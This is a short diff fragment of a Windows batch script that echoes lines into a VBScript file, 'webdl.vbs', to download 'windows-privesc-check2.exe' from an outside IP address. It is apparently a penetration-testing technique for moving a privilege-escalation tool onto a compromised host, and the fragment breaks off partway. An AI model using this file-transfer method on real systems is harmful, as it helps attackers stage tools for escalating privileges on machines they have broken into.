@@ -1,4 +1,4 @@
- echo Set args = Wscript.Arguments  >> webdl.vbs
+ echo Set args = Wscript.Arguments  > webdl.vbs
  timeout 1
  echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
  timeout 1
